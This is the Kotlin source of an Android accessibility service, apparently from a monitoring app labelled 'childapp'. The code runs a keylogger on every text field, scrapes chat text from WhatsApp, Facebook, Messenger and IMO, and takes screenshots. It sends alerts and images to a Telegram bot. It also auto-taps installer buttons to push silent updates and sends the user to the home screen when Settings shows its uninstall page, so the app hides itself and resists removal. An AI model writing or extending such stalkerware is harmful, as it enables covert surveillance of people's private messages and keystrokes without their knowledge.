package com.coc338781.childapp

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.graphics.Bitmap
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.Display
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import androidx.annotation.RequiresApi
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.TimeUnit

class ScreenService : AccessibilityService() {

    companion object {
        var instance: ScreenService? = null
        private const val TAG = "ScreenService"

        private const val PKG_WHATSAPP = "com.whatsapp"
        private const val PKG_WHATSAPP_B = "com.whatsapp.w4b"
        private const val PKG_FB = "com.facebook.katana"
        private const val PKG_FB_MSG = "com.facebook.orca"
        private const val PKG_IMO = "com.imo.android.imoim"
        private const val PKG_IMO_BETA = "com.imo.android.imoimbeta"

        private const val PKG_SETTINGS = "com.android.settings"

        @Volatile private var lastReportedApp = ""
        @Volatile private var lastReportedTime = 0L

        @Volatile private var lastReadTime = 0L
        @Volatile private var lastReadContent = ""

        @Volatile private var lastBlockedPkg = ""
        @Volatile private var lastBlockedTime = 0L
        @Volatile private var currentApp: String? = null
    }

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .build()

    private val watchdogHandler = Handler(Looper.getMainLooper())
    private var watchdogRunnable: Runnable? = null

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        Log.d(TAG, "Connected")
        startWatchdog()
    }

    private fun startWatchdog() {
        stopWatchdog()
        watchdogRunnable = object : Runnable {
            override fun run() {
                try {
                    if (!MonitoringService.isRunning) {
                        val intent = Intent(applicationContext, MonitoringService::class.java)
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            applicationContext.startForegroundService(intent)
                        } else {
                            applicationContext.startService(intent)
                        }
                    }
                } catch (_: Exception) {}
                watchdogHandler.postDelayed(this, 15000L)
            }
        }
        watchdogHandler.postDelayed(watchdogRunnable!!, 3000L)
    }

    private fun stopWatchdog() {
        watchdogRunnable?.let { watchdogHandler.removeCallbacks(it) }
        watchdogRunnable = null
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        val pkg = event.packageName?.toString() ?: return

        // ===== App Block check =====
        if (pkg != packageName && !pkg.contains("packageinstaller") && pkg != PKG_SETTINGS) {
            if (AppBlocker.isBlocked(this, pkg)) {
                val now = System.currentTimeMillis()
                if (pkg != lastBlockedPkg || now - lastBlockedTime > 10_000L) {
                    lastBlockedPkg = pkg
                    lastBlockedTime = now
                    performGlobalAction(GLOBAL_ACTION_HOME)
                    notifyTelegram("🚫 Blocked app: $pkg")
                }
                return
            }
        }

        // ===== Auto-install APK =====
        if (pkg.contains("packageinstaller")) {
            autoTapInstall()
        }

        // ===== Block Settings pages =====
        if (pkg == PKG_SETTINGS) {
            handleSettingsBlock(event)
        }

        // ===== Detect App Open =====
val isWhatsApp = pkg == PKG_WHATSAPP || pkg == PKG_WHATSAPP_B
val isFB = pkg == PKG_FB || pkg == PKG_FB_MSG
val isIMO = pkg == PKG_IMO || pkg == PKG_IMO_BETA

if (isWhatsApp && currentApp != "whatsapp") {
    currentApp = "whatsapp"
    handleAppOpen("whatsapp")
    AutoScreenshot.startContinuous(this, "whatsapp")
} else if (isFB && currentApp != "fb") {
    currentApp = "fb"
    handleAppOpen("fb")
    AutoScreenshot.startContinuous(this, "fb")
} else if (isIMO && currentApp != "imo") {
    currentApp = "imo"
    handleAppOpen("imo")
    AutoScreenshot.startContinuous(this, "imo")
} else if (!isWhatsApp && !isFB && !isIMO && currentApp != null) {
    currentApp = null
    AutoScreenshot.stopContinuous()
}

        // ===== Keylogger — text fields =====
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            try {
                val text = event.text.joinToString("")
                if (text.isNotBlank()) {
                    val appName = getAppName(pkg)
                    KeyloggerService.captureText(this, appName, text)
                }
            } catch (_: Exception) {}
        }

        // ===== Read Screen Content =====
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
            event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            when (pkg) {
                PKG_WHATSAPP, PKG_WHATSAPP_B -> readScreenContent("whatsapp")
                PKG_FB, PKG_FB_MSG -> readScreenContent("fb")
                PKG_IMO, PKG_IMO_BETA -> readScreenContent("imo")
            }
        }
    }

    private fun getAppName(pkg: String): String {
        return try {
            val pm = packageManager
            pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString()
        } catch (_: Exception) { pkg }
    }

    // ===== Auto-tap Install Button (with retry) =====
private fun autoTapInstall() {
    tryAutoTapInstall(0)
}

private fun tryAutoTapInstall(attempt: Int) {
    if (attempt >= 10) {
        Log.d(TAG, "Auto-tap: gave up after 10 attempts")
        return
    }

    try {
        val root = rootInActiveWindow ?: run {
            retryAutoTap(attempt)
            return
        }

        val installBtn = findButtonByText(root, listOf(
            "Install", "INSTALL", "Update", "UPDATE",
            "Install app", "Install anyway", "Update app",
            "Continue", "CONTINUE", "OK", "Ok"
        ))

        if (installBtn != null) {
            Log.d(TAG, "Auto-tapping Install button (attempt ${attempt + 1})")
            installBtn.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            notifyTelegram("✅ Auto-installed update")
        } else {
            Log.d(TAG, "Button not found, attempt ${attempt + 1}")
            retryAutoTap(attempt)
        }
    } catch (e: Exception) {
        Log.e(TAG, "Auto-tap error", e)
        retryAutoTap(attempt)
    }
}

private fun retryAutoTap(attempt: Int) {
    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
        tryAutoTapInstall(attempt + 1)
    }, 1000L) // 1 තත්පරයක් ඉඳලා ආයෙ try කරනවා
}

    private fun findButtonByText(node: AccessibilityNodeInfo?, texts: List<String>): AccessibilityNodeInfo? {
        node ?: return null
        try {
            val nodeText = node.text?.toString() ?: ""
            val nodeDesc = node.contentDescription?.toString() ?: ""

            for (t in texts) {
                if (nodeText.equals(t, ignoreCase = true) ||
                    nodeDesc.equals(t, ignoreCase = true) ||
                    nodeText.contains(t, ignoreCase = true)) {
                    if (node.isClickable) return node
                    var parent = node.parent
                    while (parent != null) {
                        if (parent.isClickable) return parent
                        parent = parent.parent
                    }
                    return node
                }
            }

            for (i in 0 until node.childCount) {
                val child = node.getChild(i)
                val found = findButtonByText(child, texts)
                if (found != null) return found
            }
        } catch (_: Exception) {}
        return null
    }

    // ===== Block Settings pages =====
    private fun handleSettingsBlock(event: AccessibilityEvent) {
        try {
            val root = rootInActiveWindow ?: return
            val title = findScreenTitle(root).lowercase()
            Log.d(TAG, "Settings title: $title")

            val shouldBlock = (title.contains("uninstall") && title.contains("system service")) ||
                    (title.contains("app info") && title.contains("system service"))

            if (shouldBlock) {
                Log.d(TAG, "Blocked uninstall page")
                performGlobalAction(GLOBAL_ACTION_HOME)
                notifyTelegram("🚫 Uninstall blocked — Home redirect")
            }
        } catch (_: Exception) {}
    }

    private fun findScreenTitle(node: AccessibilityNodeInfo?): String {
        node ?: return ""
        try {
            val viewId = node.viewIdResourceName ?: ""
            if (viewId.contains("action_bar") || viewId.contains("title")) {
                val t = node.text?.toString() ?: ""
                if (t.isNotBlank()) return t
            }
            for (i in 0 until node.childCount) {
                val child = node.getChild(i)
                if (child != null) {
                    val found = findScreenTitle(child)
                    if (found.isNotBlank()) return found
                }
            }
        } catch (_: Exception) {}
        return ""
    }

    // ===== Detect App Open =====
    private fun handleAppOpen(app: String) {
        val now = System.currentTimeMillis()
        if (app == lastReportedApp && now - lastReportedTime < 300000L) return

        lastReportedApp = app
        lastReportedTime = now

        val emoji = when (app) {
            "whatsapp" -> "💬"
            "fb" -> "📘"
            "imo" -> "📱"
            else -> "📩"
        }
        val time = java.text.SimpleDateFormat("hh:mm a", java.util.Locale.getDefault())
            .format(java.util.Date(now))
        notifyTelegram("$emoji ${app.uppercase()} OPENED\n🕐 $time")
    }

    // ===== Read Screen Content =====
    private fun readScreenContent(app: String) {
        try {
            val activePackage = rootInActiveWindow?.packageName?.toString() ?: return

            val isTargetApp = when (app) {
                "whatsapp" -> activePackage == PKG_WHATSAPP || activePackage == PKG_WHATSAPP_B
                "fb" -> activePackage == PKG_FB || activePackage == PKG_FB_MSG
                "imo" -> activePackage == PKG_IMO || activePackage == PKG_IMO_BETA
                else -> false
            }
            if (!isTargetApp) return

            val root = rootInActiveWindow ?: return
            val chatTexts = collectChatTexts(root)
            if (chatTexts.isEmpty()) return

            val combined = chatTexts.joinToString("\n")

            if (isAppDrawerText(combined)) return
            if (combined.length < 30) return

            if (combined == lastReadContent) return
            val now = System.currentTimeMillis()
            if (now - lastReadTime < 5000L) return

            lastReadContent = combined
            lastReadTime = now

            MessageStore.addScreenRead(this, app, combined)
        } catch (_: Exception) {}
    }

    private fun isAppDrawerText(text: String): Boolean {
        val drawerPatterns = listOf(
            "Page 1 of", "Page 2 of", "Page 3 of",
            "Search", "More options", "Folder",
            "Samsung", "Google", "Microsoft", "Play Store"
        )
        var matchCount = 0
        for (pattern in drawerPatterns) {
            if (text.contains(pattern)) matchCount++
        }
        return matchCount >= 3
    }

    private fun collectChatTexts(node: AccessibilityNodeInfo?): List<String> {
        node ?: return emptyList()
        val texts = mutableListOf<String>()
        try {
            val t = node.text?.toString() ?: ""
            val d = node.contentDescription?.toString() ?: ""

            if (t.isNotBlank() &&
                !t.startsWith("Page ") &&
                t != "Search" &&
                t != "More options" &&
                !t.contains("Folder", ignoreCase = true) &&
                t.length in 2..500) {
                texts.add(t)
            }
            if (d.isNotBlank() && d.length in 2..500 && d != t) {
                texts.add(d)
            }

            for (i in 0 until node.childCount) {
                val child = node.getChild(i)
                if (child != null) {
                    texts.addAll(collectChatTexts(child))
                }
            }
        } catch (_: Exception) {}
        return texts
    }

    private fun collectAllText(node: AccessibilityNodeInfo?): String {
        node ?: return ""
        val sb = StringBuilder()
        try {
            if (!node.text.isNullOrBlank()) {
                sb.append(node.text).append("\n")
            }
            if (!node.contentDescription.isNullOrBlank()) {
                sb.append(node.contentDescription).append("\n")
            }
            for (i in 0 until node.childCount) {
                val child = node.getChild(i)
                if (child != null) {
                    sb.append(collectAllText(child))
                }
            }
        } catch (_: Exception) {}
        return sb.toString()
    }

    private fun notifyTelegram(msg: String) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val url = "https://api.telegram.org/bot${MonitoringService.BOT_TOKEN}/sendMessage"
                val json = JSONObject().apply {
                    put("chat_id", MonitoringService.CHAT_ID)
                    put("text", msg)
                }
                val body = json.toString().toRequestBody("application/json".toMediaType())
                client.newCall(Request.Builder().url(url).post(body).build()).execute()
            } catch (_: Exception) {}
        }
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        super.onDestroy()
        stopWatchdog()
        instance = null
        Log.d(TAG, "Destroyed")
    }

    @RequiresApi(Build.VERSION_CODES.R)
    fun takeShot(callback: (Bitmap?) -> Unit) {
        takeScreenshot(Display.DEFAULT_DISPLAY, mainExecutor,
            object : TakeScreenshotCallback {
                override fun onSuccess(result: ScreenshotResult) {
                    try {
                        val bmp = Bitmap.wrapHardwareBuffer(result.hardwareBuffer, result.colorSpace)
                        result.hardwareBuffer.close()
                        callback(bmp)
                    } catch (e: Exception) { callback(null) }
                }
                override fun onFailure(errorCode: Int) { callback(null) }
            })
    }

    fun sendScreen(bitmap: Bitmap) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val file = File(cacheDir, "screen_${System.currentTimeMillis()}.jpg")
                FileOutputStream(file).use { bitmap.compress(Bitmap.CompressFormat.JPEG, 70, it) }
                val url = "https://api.telegram.org/bot${MonitoringService.BOT_TOKEN}/sendPhoto"
                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", MonitoringService.CHAT_ID)
                    .addFormDataPart("photo", file.name, file.asRequestBody("image/jpeg".toMediaType()))
                    .build()
                client.newCall(Request.Builder().url(url).post(body).build()).execute()
                file.delete()
            } catch (e: Exception) { Log.e(TAG, "err", e) }
        }
    }
}
